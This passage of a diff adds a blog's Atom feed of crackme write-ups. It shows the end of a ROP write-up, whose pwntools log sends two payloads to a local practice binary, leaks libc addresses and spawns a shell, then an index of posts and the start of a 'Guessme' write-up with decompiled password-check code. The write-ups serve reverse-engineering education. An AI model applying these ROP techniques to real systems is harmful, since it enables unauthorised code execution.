+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;[+] Starting local process &amp;#39;.&#x2F;rop&amp;#39; argv=[b&amp;#39;.&#x2F;rop&amp;#39;] : pid 7815
+&lt;&#x2F;span&gt;&lt;span&gt;[*] Stage one
+&lt;&#x2F;span&gt;&lt;span&gt;[*] Receive input
+&lt;&#x2F;span&gt;&lt;span&gt;[DEBUG] Received 0x7 bytes:
+&lt;&#x2F;span&gt;&lt;span&gt;    b&amp;#39;Input: &amp;#39;
+&lt;&#x2F;span&gt;&lt;span&gt;[*] Send first payload
+&lt;&#x2F;span&gt;&lt;span&gt;[DEBUG] Sent 0x80 bytes:
+&lt;&#x2F;span&gt;&lt;span&gt;    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+&lt;&#x2F;span&gt;&lt;span&gt;    *
+&lt;&#x2F;span&gt;&lt;span&gt;    00000040  41 41 41 41  41 41 41 41  13 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
+&lt;&#x2F;span&gt;&lt;span&gt;    00000050  01 00 00 00  00 00 00 00  11 06 40 00  00 00 00 00  │····│····│··@·│····│
+&lt;&#x2F;span&gt;&lt;span&gt;    00000060  18 10 60 00  00 00 00 00  00 00 00 00  00 00 00 00  │··`·│····│····│····│
+&lt;&#x2F;span&gt;&lt;span&gt;    00000070  30 04 40 00  00 00 00 00  37 05 40 00  00 00 00 00  │0·@·│····│7·@·│····│
+&lt;&#x2F;span&gt;&lt;span&gt;    00000080
+&lt;&#x2F;span&gt;&lt;span&gt;[*] Receiving write address
+&lt;&#x2F;span&gt;&lt;span&gt;[DEBUG] Received 0x287 bytes:
+&lt;&#x2F;span&gt;&lt;span&gt;    00000000  20 e5 23 3a  07 7f 00 00  80 e4 23 3a  07 7f 00 00  │ ·#:│····│··#:│····│
+&lt;&#x2F;span&gt;&lt;span&gt;    00000010  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
+&lt;&#x2F;span&gt;&lt;span&gt;    *
+&lt;&#x2F;span&gt;&lt;span&gt;    00000280  49 6e 70 75  74 3a 20                               │Inpu│t: │
+&lt;&#x2F;span&gt;&lt;span&gt;    00000287
+&lt;&#x2F;span&gt;&lt;span&gt;[*] write address in libc: 0x7f073a23e520
+&lt;&#x2F;span&gt;&lt;span&gt;[*] system address in libc: 0x7f073a195e50
+&lt;&#x2F;span&gt;&lt;span&gt;[*] sh address in libc: 0x7f073a2db143
+&lt;&#x2F;span&gt;&lt;span&gt;[*] Stage two
+&lt;&#x2F;span&gt;&lt;span&gt;[*] Send second payload
+&lt;&#x2F;span&gt;&lt;span&gt;[DEBUG] Sent 0x68 bytes:
+&lt;&#x2F;span&gt;&lt;span&gt;    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
+&lt;&#x2F;span&gt;&lt;span&gt;    *
+&lt;&#x2F;span&gt;&lt;span&gt;    00000040  41 41 41 41  41 41 41 41  13 06 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
+&lt;&#x2F;span&gt;&lt;span&gt;    00000050  43 b1 2d 3a  07 7f 00 00  50 5e 19 3a  07 7f 00 00  │C·-:│····│P^·:│····│
+&lt;&#x2F;span&gt;&lt;span&gt;    00000060  30 b5 18 3a  07 7f 00 00                            │0··:│····│
+&lt;&#x2F;span&gt;&lt;span&gt;    00000068
+&lt;&#x2F;span&gt;&lt;span&gt;[*] Shell spawned
+&lt;&#x2F;span&gt;&lt;span&gt;[*] Switching to interactive mode
+&lt;&#x2F;span&gt;&lt;span&gt;$ echo $0
+&lt;&#x2F;span&gt;&lt;span&gt;[DEBUG] Sent 0x8 bytes:
+&lt;&#x2F;span&gt;&lt;span&gt;    b&amp;#39;echo $0\n&amp;#39;
+&lt;&#x2F;span&gt;&lt;span&gt;[DEBUG] Received 0x8 bytes:
+&lt;&#x2F;span&gt;&lt;span&gt;    b&amp;#39;&#x2F;bin&#x2F;sh\n&amp;#39;
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;bin&#x2F;sh
+&lt;&#x2F;span&gt;&lt;span&gt;$ cat Foo.txt
+&lt;&#x2F;span&gt;&lt;span&gt;[DEBUG] Sent 0xc bytes:
+&lt;&#x2F;span&gt;&lt;span&gt;    b&amp;#39;cat Foo.txt\n&amp;#39;
+&lt;&#x2F;span&gt;&lt;span&gt;[DEBUG] Received 0x11 bytes:
+&lt;&#x2F;span&gt;&lt;span&gt;    b&amp;#39;You can read me!\n&amp;#39;
+&lt;&#x2F;span&gt;&lt;span&gt;You can read me!
+&lt;&#x2F;span&gt;&lt;span&gt;$ sl
+&lt;&#x2F;span&gt;&lt;span&gt;[DEBUG] Sent 0x3 bytes:
+&lt;&#x2F;span&gt;&lt;span&gt;    b&amp;#39;sl\n&amp;#39;
+&lt;&#x2F;span&gt;&lt;span&gt;[DEBUG] Received 0x2f bytes:
+&lt;&#x2F;span&gt;&lt;span&gt;    b&amp;#39;&#x2F;bin&#x2F;sh: linia 3: sl: nie znaleziono polecenia\n&amp;#39;
+&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;bin&#x2F;sh: linia 3: sl: nie znaleziono polecenia
+&lt;&#x2F;span&gt;&lt;span&gt;$  
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Used tools:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Ida Freeware 7.0&lt;&#x2F;li&gt;
+&lt;li&gt;GDB&lt;&#x2F;li&gt;
+&lt;li&gt;pwntools&lt;&#x2F;li&gt;
+&lt;li&gt;ROPgadget&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Crackme writeups</title>
+        <published>2020-07-16T00:00:00+00:00</published>
+        <updated>2020-07-16T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://0xf4lc0n.github.io/blog/crackme/" type="text/html"/>
+        <id>https://0xf4lc0n.github.io/blog/crackme/</id>
+        
+        <content type="html">&lt;p&gt;This post aggregates my all crackme writeups.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;table-of-content&quot;&gt;Table of content&lt;&#x2F;h3&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;crackme&#x2F;guessme&quot;&gt;Guessme&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;crackme&#x2F;zed-crackme&quot;&gt;Zed-Crackme&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;crackme&#x2F;rop-crackme&quot;&gt;Rop&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ol&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Get into that base made by js-on</title>
+        <published>2020-07-16T00:00:00+00:00</published>
+        <updated>2020-07-16T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://0xf4lc0n.github.io/blog/crackme/guessme/" type="text/html"/>
+        <id>https://0xf4lc0n.github.io/blog/crackme/guessme/</id>
+        
+        <content type="html">&lt;p&gt;&lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;crackmes.one&#x2F;crackme&#x2F;5ed3cd9a33c5d449d91ae6b1&quot;&gt;Download binary&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;After starting crackme a password prompt appears:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;.&#x2F;guessme
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;Your guess: pass
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;S0RRY!
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;If an incorrect password is entered, crackme politely apologizes to us.
+So we have to find a correct password.&lt;&#x2F;p&gt;
+&lt;p&gt;Firstly I opened an ELF file in Ghidra and changed names of local variables.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;cpp&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-cpp &quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span&gt;ulong &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;void&lt;&#x2F;span&gt;&lt;span&gt;)
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; mcs_digit_sum;
+&lt;&#x2F;span&gt;&lt;span&gt;  basic_ostream &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;long&lt;&#x2F;span&gt;&lt;span&gt; in_FS_OFFSET;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;bool&lt;&#x2F;span&gt;&lt;span&gt; password_is_correct;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; user_input;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt; password;
+&lt;&#x2F;span&gt;&lt;span&gt;  undefined4 local_74;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;long&lt;&#x2F;span&gt;&lt;span&gt; seconds;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;long&lt;&#x2F;span&gt;&lt;span&gt; microseconds;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;long&lt;&#x2F;span&gt;&lt;span&gt; miliseconds;
+&lt;&#x2F;span&gt;&lt;span&gt;  timeval timeval_stuct;
+&lt;&#x2F;span&gt;&lt;span&gt;  basic_string_char_std__char_traits_char__std__allocator_char__ string [&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;40&lt;&#x2F;span&gt;&lt;span&gt;];
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;long&lt;&#x2F;span&gt;&lt;span&gt; local_20;
+&lt;&#x2F;span&gt;&lt;span&gt;  
+&lt;&#x2F;span&gt;&lt;span&gt;  local_20 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= *&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;long &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;)(in_FS_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x28&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;allocator()&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;basic_string((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;char &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)string,(allocator &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;DAT_00102009)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;_allocator((allocator_char_ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;timeval_stuct)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;gettimeofday(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;timeval_stuct,(__timezone_ptr_t)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  
+&lt;&#x2F;span&gt;&lt;span&gt;  seconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; timeval_stuct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;tv_sec&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  microseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; timeval_stuct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;tv_usec&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  miliseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;long&lt;&#x2F;span&gt;&lt;span&gt;)((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;double&lt;&#x2F;span&gt;&lt;span&gt;)timeval_stuct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;tv_usec &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1000.00000000 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;double&lt;&#x2F;span&gt;&lt;span&gt;)(timeval_stuct.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;tv_sec &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span&gt;));
+&lt;&#x2F;span&gt;&lt;span&gt;  
+&lt;&#x2F;span&gt;&lt;span&gt;  mcs_digit_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;digit_sum(timeval_stuct.tv_usec)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;)(miliseconds &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;(mcs_digit_sum &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; microseconds));
+&lt;&#x2F;span&gt;&lt;span&gt;  local_74 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x42&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;operator___std__char_traits_char__((basic_ostream &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)cout,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Your guess: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;operator__((basic_istream_char_std__char_traits_char__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)cin,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;user_input)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  password_is_correct &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt; password &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;!=&lt;&#x2F;span&gt;&lt;span&gt; user_input;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(password_is_correct) {
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;this &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;operator___std__char_traits_char__((basic_ostream &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)cout,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;S0RRY!&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;operator__((basic_ostream_char_std__char_traits_char__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)this,endl_char_std__char_traits_char__)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  }
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;{
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;this &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;operator___std__char_traits_char__((basic_ostream &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)cout,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;R&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;this &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;operator___std__char_traits_char__(this,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;z&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;this &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;operator___std__char_traits_char__(this,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;#39;A&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;this &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;operator___std__char_traits_char__(this,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;w&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;this &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;operator___std__char_traits_char__(this,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;R&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;this &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;operator___std__char_traits_char__(this,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;#39;C&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;this &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;operator___std__char_traits_char__(this,(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)local_74)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;operator___char_std__char_traits_char__std__allocator_char__(this,(basic_string &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)string)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;this &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;operator___std__char_traits_char__((basic_ostream &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)cout,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;IhC&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;this &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;operator___std__char_traits_char__(this,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;g&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;operator__((basic_ostream_char_std__char_traits_char__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;)this,endl_char_std__char_traits_char__)
+&lt;&#x2F;span&gt;&lt;span&gt;    ;
+&lt;&#x2F;span&gt;&lt;span&gt;  }
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;_basic_string(string)&lt;&#x2F;span&gt;&lt;span&gt;;
+&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(local_20 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;!= *&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;long &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;)(in_FS_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x28&lt;&#x2F;span&gt;&lt;span&gt;)) {
